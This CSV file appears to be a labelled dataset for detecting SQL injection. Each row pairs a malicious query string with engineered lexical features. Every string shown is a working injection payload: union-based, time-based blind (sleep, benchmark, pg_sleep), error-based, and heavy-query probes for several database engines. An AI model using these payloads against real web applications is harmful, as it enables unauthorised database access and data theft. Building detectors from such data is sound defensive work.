,Query,Label,query_len,num_words_query,no_single_qts,no_double_qts,no_punct,no_single_cmnt,no_mult_cmnt,no_space,no_perc,no_log_opt,no_arith,no_null,no_hexa,no_alpha,no_digit,len_of_chr_char_null,genuine_keywords
3517,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ||'",1,98,15,1,0,12,0,0,14,0,1,1,0,0,62,3,0,2
3518,"1' in boolean mode  )   or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1,143,29,1,0,25,1,0,28,0,4,2,0,0,49,16,4,0
3519,"-4453'   )    )     )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   ",1,255,54,1,0,33,0,0,54,0,1,6,0,0,71,35,7,2
3520,"-3130  )   union all select 1741,1741,1741,1741,1741,1741,1741,1741#",1,68,6,0,0,10,0,0,5,0,0,1,0,0,14,36,0,1
3521,"-4233%""  )   or   (  8459  =  8459  )  *4906 and   (  ""%""  =  """,1,63,14,0,4,14,0,0,13,2,2,2,0,0,5,16,0,0
3522,"1   )    )    union all select null,null,null,null,null,null,null,null,null--",1,77,7,0,0,12,1,0,6,0,0,2,9,0,50,1,9,1
3523,"-5528'  )   union all select 5153,5153,5153,5153,5153,5153,5153,5153,5153#",1,74,6,1,0,12,0,0,5,0,0,1,0,0,14,40,0,1
3524,"-4589""  )   union all select 1441,1441,1441,1441,1441,1441,1441,1441,1441,1441--",1,80,6,0,1,14,1,0,5,0,0,3,0,0,14,44,0,1
3525,"1',  (  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select 1 from generate_series  (  8979,8979,case when   (  8979  =  8979  )   then 1 else 0 end  )   limit 1  )  ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric   )    )   ",1,370,76,1,0,62,0,0,76,0,10,0,0,0,95,51,10,1
3526,-8224'  )   where 6504  =  6504 or 2461  =  5660,1,48,10,1,0,5,0,0,9,0,1,1,0,0,7,20,0,0
3527,"1 where 7196  =  7196 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",1,88,16,0,0,9,1,0,15,0,1,2,0,1,20,29,0,0
3528,"1 where 6881  =  6881 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --",1,209,36,0,0,21,1,0,35,0,0,2,0,1,71,45,0,1
3529,"-5130'   )    )    union all select 5218,5218,5218,5218,5218,5218,5218,5218,5218,5218--",1,87,7,1,0,15,1,0,6,0,0,3,0,0,14,44,0,1
3530,"-7797'+  (  select oulr where 7091  =  7091 union all select 7091,7091,7091,7091,7091,7091,7091,7091,7091#",1,106,12,1,0,14,0,0,11,0,0,2,0,0,29,48,0,2
3531,-3125'   )    )     )   order by 1#,1,35,7,1,0,6,0,0,6,0,0,1,0,0,7,5,0,1
3532,"1"" union all select null,null,null,null,null,null,null,null#",1,60,5,0,1,9,0,0,4,0,0,0,8,0,46,1,8,1
3533,"1  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  ",1,123,19,0,0,16,0,0,19,0,1,1,0,0,63,10,0,2
3534,-9087 or 3038  =  3038,1,22,5,0,0,2,0,0,4,0,1,1,0,0,2,12,0,0
3535,"1  )   as tgqd where 6369  =  6369 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1,362,78,0,0,59,1,0,77,0,11,2,0,0,92,57,10,1
3536,end and 'huti' like 'huti,1,25,5,3,0,3,0,0,4,0,1,0,0,0,18,0,0,0
3537,-7346 or 8571  =  8571--,1,24,5,0,0,4,1,0,4,0,1,3,0,0,2,12,0,0
3538,"1""  )   union all select null,null,null,null--",1,46,6,0,1,7,1,0,5,0,0,2,4,0,30,1,4,1
3539,-8015  )   where 9808  =  9808 or 9323  =  9323#,1,48,10,0,0,5,0,0,9,0,1,1,0,0,7,20,0,0
3540,"1'   )    )     )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  'gucd'  =  'gucd",1,227,37,4,0,23,0,0,36,0,2,1,0,0,119,12,0,2
3541,select   (  case when   (  8978  =  1426  )   then 1 else 8978*  (  select 8978 from master..sysdatabases  )   end  )  --,1,121,22,0,0,12,1,0,21,0,0,3,0,0,53,17,0,2
3542,"1""  )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,125,20,0,1,19,1,0,19,0,1,3,0,0,62,10,0,2
3543,-1192 order by 1#,1,17,4,0,0,2,0,0,3,0,0,1,0,0,7,5,0,1
3544,"1""  )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1,74,13,0,1,9,0,0,12,0,1,0,0,1,16,21,0,0
3545,"-9661""   )    )     )   union all select 2158,2158,2158--",1,57,8,0,1,9,1,0,7,0,0,3,0,0,14,16,0,1
3546,"1%'  )   union all select null,null,null,null,null,null,null,null,null,null--",1,77,6,1,0,14,1,0,5,1,0,2,10,0,54,1,10,1
3547,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and   (  ""ihqf""  =  ""ihqf",1,123,18,0,3,13,0,0,17,0,1,1,0,0,80,3,0,2
3548,"1'   )    )     )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  'sdnc'  =  'sdnc",1,297,49,4,0,38,0,0,48,0,2,2,0,1,60,71,0,4
3549,"1"" and elt  (  3114  =  3114,sleep  (  5   )    )   #",1,53,12,0,1,8,0,0,11,0,1,0,0,0,11,10,0,0
3550,begin if   (  5624  =  5624  )   then dbms_lock.sleep  (  5  ) ,1,63,12,0,0,7,0,0,12,0,0,0,0,0,24,9,0,0
3551,"1  )   where 2044  =  2044 or elt  (  6272  =  6272,sleep  (  5   )    )   --",1,77,17,0,0,10,1,0,16,0,1,2,0,0,15,18,0,0
3552,1  )   where 4573  =  4573,1,26,6,0,0,2,0,0,5,0,0,0,0,0,5,9,0,0
3553,"1%' and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1,70,12,1,0,9,0,0,11,1,1,0,0,1,16,21,0,0
3554,-8074'  )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||c,1,255,52,1,0,42,0,0,51,0,8,1,0,0,77,36,6,1
3555,"-6123"" or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and ""zuzx""  =  ""zuzx",1,140,26,4,4,20,0,0,25,0,4,1,0,0,63,18,0,1
3556,"1"" where 2204  =  2204 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1,351,77,0,1,49,1,0,76,0,1,12,0,0,83,55,12,1
3557,1'  )   as pogx where 4105  =  4105 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,1,368,80,1,0,61,1,0,79,0,11,2,0,0,86,53,10,1
3558,"-1949  )   as smyn where 4066  =  4066 union all select 4066,4066--",1,67,12,0,0,6,1,0,11,0,0,3,0,0,25,20,0,1
3559,"1"" where 9083  =  9083 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",1,264,44,0,1,31,1,0,43,0,1,4,0,1,54,79,0,4
3560,"-7831""   )    )    as krzi where 3798  =  3798 order by 1--",1,59,12,0,1,7,1,0,11,0,0,3,0,0,18,13,0,1
3561,"-4522""  )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )  ",1,255,56,0,1,41,0,0,56,0,8,1,0,0,66,37,7,2
3562,"-2028'   )    )     )   union all select 8698,8698,8698,8698#",1,61,8,1,0,9,0,0,7,0,0,1,0,0,14,20,0,1
3563,"1"" and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and ""pmpk"" like ""pmpk",1,255,51,0,4,43,0,0,50,0,7,0,2,0,87,27,9,0
3564,"1""  )   where 4660  =  4660 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,145,24,0,1,20,1,0,23,0,1,3,0,0,67,18,0,2
3565,"1 where 6077  =  6077 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1,198,40,0,0,30,1,0,39,0,4,2,1,0,57,35,6,0
3566,"1 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  ",1,117,18,0,0,15,0,0,18,0,1,1,0,0,62,10,0,2
3567,"1 union all select null,null,null,null,null--",1,45,5,0,0,6,1,0,4,0,0,2,5,0,34,1,5,1
3568,"-3852'  )   union all select 3577,3577,3577,3577,3577,3577,3577,3577#",1,69,6,1,0,11,0,0,5,0,0,1,0,0,14,36,0,1
3569,"1'   )    )    as jxvv where 6593  =  6593 or elt  (  6272  =  6272,sleep  (  5   )    )   --",1,93,20,1,0,12,1,0,19,0,1,2,0,0,21,18,0,0
3570,"1  )   where 5232  =  5232 union all select null,null,null#",1,59,10,0,0,5,0,0,9,0,0,0,3,0,31,9,3,1
3571,"-8943%'  )   union all select 7710,7710#",1,40,6,1,0,6,0,0,5,1,0,1,0,0,14,12,0,1
3572,"1%' union all select null,null,null,null,null--",1,47,5,1,0,8,1,0,4,1,0,2,5,0,34,1,5,1
3573,"-5744  )   union all select 3617,3617,3617,3617,3617,3617--",1,59,6,0,0,9,1,0,5,0,0,3,0,0,14,28,0,1
3574,"1,  (  case when 8260  =  8260 then 1 else null end  )  ",1,56,13,0,0,4,0,0,13,0,0,0,1,0,23,10,1,0
3575,1'  )   or sleep  (  5  )  #,1,28,8,1,0,5,0,0,7,0,1,0,0,0,7,2,0,0
3576,"1""  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""tzog"" like ""tzog",1,155,25,0,4,17,0,0,24,0,2,1,0,0,87,8,0,2
3577,"-5996  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||ch",1,255,54,0,0,41,0,0,53,0,8,1,0,0,70,40,6,1
3578,1'||  (  select 'mlwj' from dual where 4247  =  4247 and 1702  =  8469  )  ||',1,78,16,4,0,12,0,0,15,0,3,0,0,0,26,17,0,1
3579,"-4054"" or 2824  =  4788--",1,25,5,0,1,5,1,0,4,0,1,3,0,0,2,12,0,0
3580,"1'   )    )     )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (     (  'zxrb'  =  'zxrb",1,347,66,4,0,41,0,0,65,0,2,2,0,0,110,55,0,7
3581,"  (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",1,100,15,0,0,10,0,0,16,0,0,1,0,0,62,3,0,2
3582,"1""   )    )    as vigs where 6175  =  6175 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",1,283,48,0,1,33,1,0,47,0,1,4,0,1,59,79,0,4
3583,1'+  (  select 'dpun' where 4760  =  4760,1,41,8,3,0,6,0,0,7,0,0,1,0,0,15,9,0,1
3584,"1'  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  ",1,144,23,1,0,19,0,0,23,0,1,0,0,1,33,39,0,1
3585,1'+  (  select tart where 9861  =  9861,1,39,8,1,0,4,0,0,7,0,0,1,0,0,15,9,0,1
3586,-9555'   )    )     )   or   (  8459  =  8459  )  *4906 and    (    (     (  'rwpq' like 'rwpq,1,94,18,4,0,15,0,0,17,0,2,2,0,0,17,16,0,0
3587,"1""  )   as pydh where 3407  =  3407 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,208,35,0,1,17,1,0,34,0,1,3,0,0,120,20,0,2
3588,"1"" where 1831  =  1831 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",1,100,22,0,1,12,0,0,21,0,1,1,0,0,33,10,0,2
3589,1   )    )    as goar where 2405  =  2405 and 5927  =  9731--,1,61,13,0,0,6,1,0,12,0,1,2,0,0,14,17,0,0
3590,"1'+  (  select ounb where 4653  =  4653 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  +'",1,214,40,2,0,28,0,0,39,0,1,3,0,1,58,40,0,4
3591,"-9772' or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (",1,255,54,1,0,42,0,0,53,0,8,1,0,0,71,40,7,1
3592,"-2116%'   )    )     )   union all select 7119,7119,7119,7119,7119--",1,68,8,1,0,12,1,0,7,1,0,3,0,0,14,24,0,1
3593,1  )   where 7729  =  7729,1,26,6,0,0,2,0,0,5,0,0,0,0,0,5,9,0,0
3594,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  8126  =  8126",1,82,13,0,0,7,0,0,12,0,1,0,0,1,23,23,0,1
3595,"1   )    )    as zdbj where 2300  =  2300   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  --",1,375,76,0,0,54,1,0,75,0,5,2,2,0,115,43,9,1
3596,1'+  (  select uhsy where 4596  =  4596 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno   )    )   +',1,125,26,2,0,16,0,0,25,0,1,3,0,0,43,10,0,3
3597,"1""   )    )    as ogzn where 6849  =  6849 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,158,28,0,1,17,1,0,27,0,1,3,0,0,76,16,0,2
3598,-5580 or 4829  =  1968,1,22,5,0,0,2,0,0,4,0,1,1,0,0,2,12,0,0
3599,"1  )   where 8630  =  8630 union all select null,null--",1,55,10,0,0,5,1,0,9,0,0,2,2,0,27,9,2,1
3600,"1' in boolean mode  )   union all select null,null,null,null,null,null--",1,72,9,1,0,9,1,0,8,0,0,2,6,0,51,1,6,1
3601,1  )   as qkkm where 8461  =  8461,1,34,8,0,0,2,0,0,7,0,0,0,0,0,11,9,0,0
3602,"1""   )    )    or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   ""vypw"" like ""vypw",1,168,27,0,4,19,0,0,26,0,2,1,0,0,86,8,0,2
3603,"-5386'  )   union all select 8026,8026,8026,8026,8026,8026#",1,59,6,1,0,9,0,0,5,0,0,1,0,0,14,28,0,1
3604,1'||  (  select 'dajl' from dual where 8440  =  8440,1,52,10,3,0,7,0,0,9,0,1,0,0,0,23,9,0,1
3605,1'   )    )    and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'mmow'  =  'mmow,1,374,80,4,0,54,0,0,79,0,2,10,0,0,89,47,12,1
3606,"1"" union all select null,null,null,null#",1,40,5,0,1,5,0,0,4,0,0,0,4,0,30,1,4,1
3607,1'   )    )    as cjjm where 1981  =  1981,1,42,9,1,0,4,0,0,8,0,0,0,0,0,11,9,0,0
3608,"1""  )   where 3507  =  3507",1,27,6,0,1,3,0,0,5,0,0,0,0,0,5,9,0,0
3609,1' or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and 'hokd'  =  'hokd,1,84,17,4,0,11,0,0,16,0,2,0,0,0,30,10,0,1
3610,"1'  )   or elt  (  5873  =  5873,sleep  (  5   )    )   #",1,57,13,1,0,9,0,0,12,0,1,0,0,0,10,10,0,0
3611,1'  )   where 3861  =  3861,1,27,6,1,0,3,0,0,5,0,0,0,0,0,5,9,0,0
3612,"1""  )   and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,135,23,0,1,17,1,0,22,0,1,3,0,0,72,9,0,2
3613,"1""   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (   ""grct""  =  ""grct",1,126,25,0,4,18,0,0,24,0,1,1,0,0,41,2,0,2
3614,"-2417  )   union all select 2169,2169,2169,2169,2169,2169,2169,2169,2169,2169#",1,78,6,0,0,12,0,0,5,0,0,1,0,0,14,44,0,1
3615,"-6368' union all select 6529,6529,6529--",1,40,5,1,0,6,1,0,4,0,0,3,0,0,14,16,0,1
3616,-3378'   )    )    or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113 ,1,255,51,1,0,40,0,0,51,0,7,1,0,0,76,36,6,1
3617,"1 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",1,251,44,0,0,29,0,0,44,0,1,2,0,0,96,35,1,4
3618,"1%""   )    )    and 4595  =  4595#",1,34,7,0,1,6,0,0,6,1,1,0,0,0,3,9,0,0
3619,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  """,1,154,26,0,4,24,0,0,25,2,2,0,0,1,36,39,0,1
3620,-3450' where 4478  =  4478 or 9323  =  9323#,1,44,9,1,0,5,0,0,8,0,1,1,0,0,7,20,0,0
3621,"-6478""   )    )    union all select 7087,7087,7087,7087,7087,7087,7087,7087--",1,77,7,0,1,13,1,0,6,0,0,3,0,0,14,36,0,1
3622,"1   )    )    and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1,189,38,0,0,31,1,0,37,0,4,2,1,0,53,25,6,0
3623,"-3725'   )    )    union all select 1541,1541,1541,1541,1541#",1,61,7,1,0,9,0,0,6,0,0,1,0,0,14,24,0,1
3624,"1%"" and 5411  =  7697 and ""%""  =  """,1,35,9,0,4,8,0,0,8,2,2,0,0,0,6,9,0,0
3625,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and '%'  =  '",1,168,33,3,0,29,0,0,32,1,3,0,2,0,60,16,5,0
3626,"-2059%"" or elt  (  4587  =  3101,3101  )   and ""%""  =  """,1,56,12,0,4,12,0,0,11,2,2,1,0,0,8,16,0,0
3627,"1""  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""vnso"" like ""vnso",1,154,25,0,4,17,0,0,24,0,2,1,0,0,86,8,0,2
3628,"1"" rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and ""cxsu"" like ""cxsu",1,103,21,0,4,13,0,0,20,0,1,1,0,0,45,2,0,2
3629,"-5158'   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   'noaj' like 'noaj",1,92,16,4,0,14,0,0,15,0,2,1,0,0,24,16,0,0
3630,"1%""  )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,124,21,0,1,16,1,0,20,1,1,3,0,0,65,8,0,2
3631,"1""   )    )     )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1,86,15,0,1,11,0,0,14,0,1,0,0,1,16,21,0,0
3632,"-6733'  )   where 4024  =  4024 union all select 4024,4024,4024,4024#",1,69,10,1,0,8,0,0,9,0,0,1,0,0,19,28,0,1
3633,1   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (   7805  =  7805,1,119,25,0,0,14,0,0,24,0,2,1,0,0,30,10,0,2
3634,select   (  case when   (  7980  =  3703  )   then 7980 else 7980*  (  select 7980 from information_schema.character_sets  )   end  )  #,1,136,22,0,0,12,0,0,21,0,0,1,0,0,65,20,1,2
3635,1' where 2911  =  2911,1,22,5,1,0,2,0,0,4,0,0,0,0,0,5,9,0,0
3636,"1'   )    )    as namw where 1740  =  1740 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --",1,181,31,1,0,23,1,0,30,0,1,2,0,1,44,47,0,1
3637,-4684  )   as uqjn where 4550  =  4550 or 1689  =  5825,1,55,12,0,0,4,0,0,11,0,1,1,0,0,13,20,0,0
3638,"1   )    )    or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   4090  =  4090",1,275,55,0,0,44,0,0,54,0,7,0,2,0,74,37,9,0
3639,"1'||  (  select 'dbxr' where 4014  =  4014 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,161,26,3,0,24,1,0,25,0,2,3,0,0,78,18,0,3
3640,"-4947' in boolean mode  )   union all select 3314,3314#",1,55,9,1,0,5,0,0,8,0,0,1,0,0,27,12,0,1
3641,"-7101   )    )     )   union all select 4587,4587,4587,4587,4587,4587--",1,71,8,0,0,11,1,0,7,0,0,3,0,0,14,28,0,1
3642,1'+  (  select 'sfko' where 6853  =  6853 rlike sleep  (  5  )  #,1,65,14,3,0,9,0,0,13,0,0,1,0,0,25,10,0,1
3643,1'||  (  select 'xqqp' where 3007  =  3007 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,1,120,25,3,0,17,0,0,24,0,2,1,0,0,43,10,0,3
3644,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  ""jcyh""  =  ""jcyh",1,192,36,0,3,31,0,0,35,0,3,0,2,0,68,16,5,0
3645,"-5300' union all select 2750,2750,2750,2750,2750,2750--",1,55,5,1,0,9,1,0,4,0,0,3,0,0,14,28,0,1
3646,"1%'   )    )     )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (     (  '%'  =  '",1,169,34,4,0,34,0,0,33,2,5,0,0,0,39,16,4,0
3647,"-5218  )   union all select 9677,9677#",1,38,6,0,0,4,0,0,5,0,0,1,0,0,14,12,0,1
